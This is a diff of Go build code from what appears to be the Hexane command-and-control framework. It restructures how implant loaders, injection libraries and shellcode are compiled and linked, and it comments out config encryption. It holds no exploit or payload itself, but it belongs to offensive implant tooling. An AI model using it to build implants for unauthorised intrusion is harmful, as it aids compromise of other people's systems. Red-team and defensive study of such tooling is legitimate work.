@@ -1,18 +1,14 @@
 package core
 
 import (
-	"bufio"
 	"fmt"
 	"os"
-	"os/exec"
 	"path"
-	"strconv"
 	"time"
 )
 
 var (
 	LinkerLoader 	= LoaderPath + "/linker.loader.ld"
-	LinkerImplant 	= ImplantPath + "/linker.implant.ld"
 	HashStrings 	= ConfigsPath + "/strings.txt"
 	DllMain   		= LoaderPath + "/dllmain.cpp"
 	RsrcScript  	= LoaderPath + "/resource.rc"
@@ -32,133 +28,6 @@ func (h *HexaneConfig) RunBuild() error {
 	return nil
 }
 
-func (h *HexaneConfig) CreateIncludes(incs []string) string {
-	var list string
-
-	for _, inc := range incs {
-		list += fmt.Sprintf(" -I%s ", inc)
-	}
-
-	return list
-}
-
-func (h *HexaneConfig) CreateArguments(args []string) string {
-	var (
-		list string
-	)
-
-	for _, arg := range args {
-		list += fmt.Sprintf(" %s ", arg)
-	}
-	return list
-}
-
-func (h *HexaneConfig) CreateDefinitions(defs map[string][]byte) string {
-	var list string
-
-	if h.Implant.ProfileTypeId == TRANSPORT_HTTP {
-		list += " -DTRANSPORT_HTTP "
-
-	} else if h.Implant.ProfileTypeId == TRANSPORT_PIPE {
-		list += " -DTRANSPORT_PIPE "
-	}
-
-	if h.Compiler.Debug {
-		list += " -DDEBUG "
-	}
-
-	for name, def := range defs {
-		arr := CreateCppArray(def, len(def))
-
-		if def == nil {
-			list += fmt.Sprintf(" -D%s ", name)
-		} else {
-			list += fmt.Sprintf(" -D%s=%s ", name, arr)
-		}
-	}
-	return list
-}
-
-func GenerateHashes(stringsFile string, outFile string) error {
-	var (
-		err      error
-		hashFile *os.File
-		strFile  *os.File
-	)
-
-	if strFile, err = os.Open(stringsFile); err != nil {
-		return err
-	}
-
-	defer func() {
-		if err = strFile.Close(); err != nil {
-			WrapMessage("ERR", err.Error())
-		}
-	}()
-
-	if hashFile, err = os.OpenFile(outFile, FstatWrite, 0644); err != nil {
-		return err
-	}
-
-	defer func() {
-		if err = hashFile.Close(); err != nil {
-			WrapMessage("ERR", err.Error())
-		}
-	}()
-
-	scanner := bufio.NewScanner(strFile)
-	writer := bufio.NewWriter(hashFile)
-
-	defer func() {
-		if err = writer.Flush(); err != nil {
-			WrapMessage("ERR", err.Error())
-		}
-	}()
-
-	for scanner.Scan() {
-		line := scanner.Text()
-		hash := GetHashFromString(line)
-
-		if _, err = writer.WriteString(hash + "\n"); err != nil {
-			return err
-		}
-	}
-
-	if err = scanner.Err(); err != nil {
-		return err
-	}
-
-	return nil
-}
-
-func (h *HexaneConfig) CompileObject(command string, targets, flags, includes []string, output string) error {
-	var (
-		Command string
-		err     error
-	)
-
-	Command += command
-
-	if targets != nil {
-		Command += h.CreateArguments(targets)
-	}
-
-	if includes != nil {
-		Command += h.CreateIncludes(includes)
-	}
-
-	if flags != nil {
-		Command += h.CreateArguments(flags)
-	}
-
-	Command += fmt.Sprintf(" -o %s ", output)
-
-	if err = h.RunCommand(Command); err != nil {
-		return err
-	}
-	return nil
-}
-
 func (h *HexaneConfig) GenerateConfig() error {
 	var (
 		Patch []byte
@@ -173,6 +42,7 @@ func (h *HexaneConfig) GenerateConfig() error {
 		return err
 	}
 
+	// Patch = XteaCrypt()
 	Xtea = Patch
 
 	h.ConfigBytes = Xtea
@@ -205,7 +75,7 @@ func (h *HexaneConfig) GenerateLoader() error {
 	}
 
 	WrapMessage("DBG", "compiling execute object")
-	if err = h.CompileObject(h.Compiler.Mingw+" -c ", []string{CoreCpp, injectCfg.ExecuteObj}, nil, h.Compiler.IncludeDirs, CoreComponents); err != nil {
+	if err = h.CompileObject(h.Compiler.Mingw+" -c ", []string{CoreCpp, injectCfg.ExecuteObj}, nil, h.Compiler.IncludeDirs, nil, CoreComponents); err != nil {
 		return err
 	}
 
@@ -216,7 +86,7 @@ func (h *HexaneConfig) GenerateLoader() error {
 	}
 
 	WrapMessage("DBG", "compiling final dll")
-	if err = h.CompileObject(h.Compiler.Linker+" -T "+LinkerLoader, Components, []string{"-shared"}, h.Compiler.IncludeDirs, Output); err != nil {
+	if err = h.CompileObject(h.Compiler.Linker+" -T "+LinkerLoader, Components, []string{"-shared"}, h.Compiler.IncludeDirs, nil, Output); err != nil {
 		return err
 	}
 
@@ -235,89 +105,59 @@ func (h *HexaneConfig) GenerateLoader() error {
 	return nil
 }
 
-func (h *HexaneConfig) GenerateObjects() error {
+
+func (h *HexaneConfig) GenerateLibs(rootPath string, srcPath string, incPath string, tmpPath string, linker string, libName string) error {
 	var (
-		files []os.DirEntry
-		dir   string
-		err   error
+		buildFiles 	[]string
+		flags 		[]string
+		files 		[]os.DirEntry
+		err   		error
 	)
 
-	WrapMessage("DBG", "generating strings config")
-	var embedStrings = h.GetEmbededStrings(ModuleStrings)
 
-	for _, dir = range h.Compiler.ComponentDirs {
-		if files, err = os.ReadDir(dir); err != nil {
-			return err
-		}
-
-		for _, file := range files {
-			if file.Name() == ".idea" {
-				continue
-			}
-
-			FilePath := dir + "/" + file.Name()
-			ObjFile := h.Compiler.BuildDirectory + "/" + file.Name() + ".o"
-
-			if path.Ext(file.Name()) == ".cpp" {
-				if err = h.CompileObject(h.Compiler.Mingw+" -c ", []string{FilePath}, h.Compiler.Flags, []string{RootDirectory}, ObjFile); err != nil {
-					return err
-				}
-
-				if file.Name() == "core.cpp" {
-					WrapMessage("DBG", "embedding core config")
-					if err = h.EmbedSectionData(ObjFile, ".text$F", h.ConfigBytes); err != nil {
-						return err
-					}
-
-					WrapMessage("DBG", "embedding strings config")
-					if err = h.EmbedSectionData(ObjFile, ".text$G", embedStrings); err != nil {
-						return err
-					}
-				}
-
-				h.Components = append(h.Components, ObjFile)
-
-			} else if path.Ext(file.Name()) == ".asm" {
-				if err = h.CompileObject(h.Compiler.Assembler+" -f win64 ", []string{FilePath}, nil, nil, ObjFile); err != nil {
-					return err
-				}
-
-				h.Components = append(h.Components, ObjFile)
-			}
-		}
-	}
-
-	Intermediate := h.Compiler.BuildDirectory + "/interm.exe"
-
-	WrapMessage("DBG", "linking core components")
-	if err = h.CompileObject(h.Compiler.Linker+" -T "+LinkerImplant, h.Components, nil, h.Compiler.IncludeDirs, Intermediate); err != nil {
+	if err = CreateTemp(tmpPath); err != nil {
 		return err
 	}
 
-	return nil
-}
-
-func (h *HexaneConfig) RunCommand(cmd string) error {
-	var (
-		Command *exec.Cmd
-		Log     *os.File
-		LogName string
-		err     error
-	)
-
-	LogName = LogsPath + strconv.Itoa(int(h.Implant.PeerId)) + "-build-error.log"
-	if Log, err = os.Create(LogName); err != nil {
+	if files, err = FindFiles(srcPath); err != nil {
 		return err
 	}
 
-	defer Log.Close()
+	if linker != "" {
+		flags = append(h.Compiler.Flags, " -T ",linker)
+	} else {
+		flags = h.Compiler.Flags
+	}
 
-	Command = exec.Command("bash", "-c", cmd)
-	Command.Stdout = Log
-	Command.Stderr = Log
+	for _, file := range files {
 
-	if err = Command.Run(); err != nil {
-		return fmt.Errorf("compilation error. Check %s for details", LogName)
+		objFile := tmpPath + "/" + file.Name() + ".o"
+		Append := false
+
+
+		if path.Ext(file.Name()) == ".cpp" {
+			if err = h.CompileObject(h.Compiler.Mingw + " -c ", []string{file.Name()}, flags, []string{incPath}, nil, objFile); err != nil {
+				return err
+			}
+
+			Append = true
+		}
+
+		if path.Ext(file.Name()) == ".asm" {
+			if err = h.CompileObject(h.Compiler.Assembler+" -f win64 ", []string{file.Name()}, nil, nil, nil, objFile); err != nil {
+				return err
+			}
+
+			Append = true
+		}
+
+		if Append {
+			buildFiles = append(buildFiles, objFile)
+		}
+	}
+
+	if err = h.CompileObject("ar", buildFiles, []string{"rcs"}, []string{incPath}, nil, rootPath + "/" + libName); err != nil {
+		return err
 	}
 
 	return nil
@@ -344,8 +184,16 @@ func (h *HexaneConfig) BuildUpdate() error {
 	}
 
 	WrapMessage("INF", "generating core components")
-	if err = h.GenerateObjects(); err != nil {
-		return err
+	if !SearchFile(Corelib, "corelib.a") {
+		if err = h.GenerateLibs(Corelib, Corelib+"/src", Corelib+"/include", Corelib, Corelib+"/corelib.ld", "corelib.a"); err != nil {
+			return err
+		}
+	}
+
+	if h.Implant.Injection != nil {
+		if err = h.GenerateLibs(Injectlib, Injectlib+"/src", Injectlib+"/include", h.Compiler.BuildDirectory+"/build", Injectlib+"/injectlib.ld", h.Compiler.BuildDirectory+"injectlib.a"); err != nil {
+			return err
+		}
 	}
 
 	WrapMessage("INF", "generating shellcode")
